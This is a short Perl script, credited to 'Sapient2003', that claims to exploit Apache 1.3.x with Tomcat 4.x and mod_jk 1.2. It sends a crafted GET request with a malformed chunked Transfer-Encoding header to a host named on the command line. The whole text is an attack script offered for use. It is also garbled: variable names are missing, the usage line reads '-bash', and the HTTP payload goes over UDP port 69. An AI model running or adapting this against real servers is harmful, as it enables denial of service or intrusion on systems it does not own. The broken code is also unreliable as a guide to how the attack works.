#!/usr/bin/perl -w

use IO::Socket;

 = "Apache 1.3.x, Tomcat 4.x Server, mod_jk 1.2 using Apache Jserv
Protocol 1.3";

unless (@ARGV == 1) {
  print "\n By Sapient2003\n";
  die "usage: -bash <host to exploit>\n";
}
print "\n By Sapient2003\n";

 = "GET / HTTP/1.0\nHost: [0]\nTransfer-ENcoding:
Chunked\n53636f7474";

 = IO::Socket::INET->new(
        PeerAddr => [0],
        PeerPort => 69,
        Proto    => "udp",
) or die "Can't find host [0]\n";
print  ;
print "Attempted to exploit [0]\n";
close();
